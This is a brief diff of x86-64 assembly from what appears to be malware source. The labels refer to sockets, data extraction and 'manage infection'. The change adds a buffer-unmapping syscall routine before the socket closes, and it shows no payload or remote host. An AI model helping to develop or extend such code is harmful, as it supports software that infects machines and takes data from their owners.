@@ -457,6 +457,13 @@ _initSocket:
         mov rax, rdi
         ret
 
+_munmapExtractBuffer:
+    mov rax, SYS_UNMAP
+    mov rdi, rsi
+    mov rsi, rdx
+    syscall
+    pop rdi
+
 ; (rdi: socket)
 _closeSock:
     mov rax, SYS_CLOSE
@@ -517,7 +524,8 @@ _extractData:
         xor r10, r10
         xor r9, r9
         syscall
-        jmp _closeSock 
+        push rdi
+        jmp _munmapExtractBuffer
 
 ; manage infection
 _isInfectionAllow:
